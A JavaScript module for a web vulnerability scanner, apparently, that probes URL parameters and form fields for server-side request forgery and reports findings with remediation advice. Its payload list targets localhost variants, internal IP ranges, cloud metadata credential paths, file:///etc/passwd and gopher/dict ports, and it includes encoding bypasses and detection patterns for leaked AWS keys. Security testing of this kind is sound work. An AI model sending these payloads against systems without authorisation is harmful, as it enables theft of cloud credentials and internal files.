import { BaseScanner } from './BaseScanner.js';

export class SSRFScanner extends BaseScanner {
  constructor(config) {
    super(config);
    this.name = 'SSRF Scanner';
    
    // SSRF test payloads - internal network addresses
    this.payloads = [
      // Localhost variations
      'http://127.0.0.1',
      'http://127.0.0.1:80',
      'http://127.0.0.1:443',
      'http://127.0.0.1:22',
      'http://127.0.0.1:8080',
      'http://127.0.0.1:3000',
      'http://localhost',
      'http://localhost:80',
      'http://0.0.0.0',
      'http://0.0.0.0:80',
      
      // Decimal IP encoding
      'http://2130706433', // 127.0.0.1
      'http://017700000001', // Octal
      'http://0x7f000001', // Hex
      
      // IPv6 localhost
      'http://[::1]',
      'http://[0:0:0:0:0:0:0:1]',
      'http://[::ffff:127.0.0.1]',
      
      // Internal network ranges
      'http://192.168.0.1',
      'http://192.168.1.1',
      'http://10.0.0.1',
      'http://172.16.0.1',
      
      // Cloud metadata endpoints
      'http://169.254.169.254', // AWS/GCP/Azure metadata
      'http://169.254.169.254/latest/meta-data/',
      'http://169.254.169.254/latest/user-data/',
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://metadata.google.internal', // GCP
      'http://metadata.google.internal/computeMetadata/v1/',
      'http://100.100.100.200', // Alibaba Cloud
      
      // URL encoding bypass
      'http://127.0.0.1%00@evil.com',
      'http://evil.com@127.0.0.1',
      'http://127.0.0.1#@evil.com',
      
      // DNS rebinding (using common rebind services)
      'http://localtest.me', // Resolves to 127.0.0.1
      'http://127.0.0.1.nip.io',
      'http://spoofed.burpcollaborator.net',
      
      // Protocol smuggling
      'file:///etc/passwd',
      'file:///c:/windows/system32/drivers/etc/hosts',
      'dict://127.0.0.1:11211',
      'gopher://127.0.0.1:6379',
      'ftp://127.0.0.1',
      
      // Bypass techniques
      'http://127。0。0。1', // Unicode dots
      'http://①②⑦.0.0.1',
      'http://127%2e0%2e0%2e1' // URL encoded dots
    ];
    
    // URL parameters that commonly accept URLs
    this.urlParameters = [
      'url', 'uri', 'path', 'src', 'source', 'href', 'link',
      'redirect', 'redirect_uri', 'redirect_url', 'return', 'returnUrl',
      'next', 'target', 'destination', 'dest', 'redir', 'go',
      'page', 'view', 'site', 'domain', 'host', 'callback',
      'feed', 'data', 'reference', 'ref', 'file', 'load',
      'image', 'img', 'imgurl', 'picture', 'pic', 'icon',
      'pdf', 'document', 'doc', 'fetch', 'request', 'proxy',
      'api', 'endpoint', 'service', 'remote', 'external'
    ];
  }
  
  async scan(data) {
    const vulnerabilities = [];
    const { urls, forms, parameters } = data;
    
    // Identify URL-accepting parameters
    const potentialParams = parameters.filter(p => 
      this.urlParameters.some(up => p.toLowerCase().includes(up))
    );
    
    // Test URL parameters
    for (const url of urls) {
      if (this.stopped) break;
      
      try {
        const parsedUrl = new URL(url);
        
        for (const [key, value] of parsedUrl.searchParams.entries()) {
          // Check if parameter looks like it accepts URLs
          if (potentialParams.includes(key) || this.looksLikeUrl(value)) {
            const vulns = await this.testParameter(url, key, value);
            vulnerabilities.push(...vulns);
          }
        }
      } catch (error) {
        this.log(`SSRF URL parse error: ${error.message}`, 'debug');
      }
    }
    
    // Test forms with URL-like inputs
    for (const form of forms) {
      if (this.stopped) break;
      
      for (const input of form.inputs) {
        if (!input.name) continue;
        
        if (this.urlParameters.some(up => input.name.toLowerCase().includes(up))) {
          const vulns = await this.testFormInput(form, input);
          vulnerabilities.push(...vulns);
        }
      }
    }
    
    return vulnerabilities;
  }
  
  async testParameter(baseUrl, paramName, originalValue) {
    const vulnerabilities = [];
    
    // Test a subset of payloads
    const testPayloads = this.getTestPayloads();
    
    for (const payload of testPayloads) {
      if (this.stopped) break;
      
      try {
        const testUrl = new URL(baseUrl);
        testUrl.searchParams.set(paramName, payload);
        
        const startTime = Date.now();
        const response = await this.makeRequest(testUrl.href, {
          timeout: 15000,
          maxRedirects: 0
        });
        const duration = Date.now() - startTime;
        
        if (!response) continue;
        
        const ssrfIndicators = this.detectSSRF(response, payload, duration);
        
        if (ssrfIndicators.detected) {
          vulnerabilities.push({
            type: 'SSRF',
            subType: ssrfIndicators.type,
            severity: ssrfIndicators.severity,
            url: baseUrl,
            parameter: paramName,
            payload: payload,
            evidence: ssrfIndicators.evidence,
            description: `Server-Side Request Forgery (SSRF) vulnerability in parameter "${paramName}". ${ssrfIndicators.description}`,
            remediation: 'Implement URL validation with allowlists. Block internal IP ranges and cloud metadata endpoints. Use DNS resolution validation.',
            references: [
              'https://portswigger.net/web-security/ssrf',
              'https://owasp.org/www-community/attacks/Server_Side_Request_Forgery',
              'https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html'
            ],
            cvss: ssrfIndicators.severity === 'critical' ? 9.1 : 7.5,
            cwe: 'CWE-918'
          });
          
          break; // Found vulnerability for this parameter
        }
      } catch (error) {
        this.log(`SSRF test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  async testFormInput(form, input) {
    const vulnerabilities = [];
    const testPayloads = this.getTestPayloads();
    
    for (const payload of testPayloads) {
      if (this.stopped) break;
      
      const formData = {};
      form.inputs.forEach(inp => {
        formData[inp.name] = inp.name === input.name ? payload : inp.value || 'test';
      });
      
      try {
        const response = await this.makeRequest(form.action, {
          method: form.method,
          data: form.method === 'POST' ? formData : undefined,
          params: form.method === 'GET' ? formData : undefined,
          timeout: 15000,
          maxRedirects: 0
        });
        
        if (!response) continue;
        
        const ssrfIndicators = this.detectSSRF(response, payload, 0);
        
        if (ssrfIndicators.detected) {
          vulnerabilities.push({
            type: 'SSRF',
            subType: ssrfIndicators.type,
            severity: ssrfIndicators.severity,
            url: form.action,
            method: form.method,
            parameter: input.name,
            payload: payload,
            evidence: ssrfIndicators.evidence,
            description: `SSRF vulnerability in form field "${input.name}"`,
            remediation: 'Implement URL validation with allowlists. Block internal IP ranges.',
            references: [
              'https://portswigger.net/web-security/ssrf'
            ],
            cvss: 7.5,
            cwe: 'CWE-918'
          });
          break;
        }
      } catch (error) {
        this.log(`SSRF form test error: ${error.message}`, 'debug');
      }
    }
    
    return vulnerabilities;
  }
  
  detectSSRF(response, payload, duration) {
    const result = {
      detected: false,
      type: '',
      severity: 'high',
      evidence: '',
      description: ''
    };
    
    const body = response.data?.toString() || '';
    const status = response.status;
    
    // Check for internal content indicators
    const internalIndicators = [
      { pattern: /root:.*:0:0:/i, type: 'Internal File Access', severity: 'critical' },
      { pattern: /\[boot loader\]/i, type: 'Internal File Access', severity: 'critical' },
      { pattern: /"Code"\s*:\s*"Success"/i, type: 'Cloud Metadata Access', severity: 'critical' },
      { pattern: /ami-id/i, type: 'AWS Metadata Access', severity: 'critical' },
      { pattern: /instance-id/i, type: 'Cloud Metadata Access', severity: 'critical' },
      { pattern: /AccessKeyId/i, type: 'Cloud Credentials Exposure', severity: 'critical' },
      { pattern: /SecretAccessKey/i, type: 'Cloud Credentials Exposure', severity: 'critical' },
      { pattern: /computeMetadata/i, type: 'GCP Metadata Access', severity: 'critical' },
      { pattern: /localhost|127\.0\.0\.1/i, type: 'Internal Network Access', severity: 'high' }
    ];
    
    for (const indicator of internalIndicators) {
      if (indicator.pattern.test(body)) {
        result.detected = true;
        result.type = indicator.type;
        result.severity = indicator.severity;
        result.evidence = `Pattern matched: ${indicator.pattern}`;
        result.description = `Server fetched internal resource successfully`;
        return result;
      }
    }
    
    // Check for error messages indicating SSRF attempt
    const ssrfErrors = [
      /connection refused/i,
      /couldn't connect to server/i,
      /network is unreachable/i,
      /name resolution failed/i,
      /protocol not supported/i
    ];
    
    for (const errorPattern of ssrfErrors) {
      if (errorPattern.test(body)) {
        result.detected = true;
        result.type = 'Potential SSRF';
        result.severity = 'medium';
        result.evidence = `Error message indicates SSRF attempt: ${body.substring(0, 100)}`;
        result.description = 'Server attempted to connect to the specified internal address';
        return result;
      }
    }
    
    // Check for timing-based detection
    if (payload.includes('127.0.0.1') && duration < 500 && status !== 400 && status !== 404) {
      result.detected = true;
      result.type = 'Potential SSRF (Timing)';
      result.severity = 'medium';
      result.evidence = `Fast response (${duration}ms) suggests server may have connected locally`;
      result.description = 'Response timing indicates possible internal network access';
      return result;
    }
    
    return result;
  }
  
  getTestPayloads() {
    // Return a subset for faster scanning
    return [
      'http://127.0.0.1',
      'http://localhost',
      'http://169.254.169.254/latest/meta-data/',
      'http://[::1]',
      'http://2130706433',
      'file:///etc/passwd'
    ];
  }
  
  looksLikeUrl(value) {
    if (!value) return false;
    return /^https?:\/\//i.test(value) || /^\/\//i.test(value);
  }
}
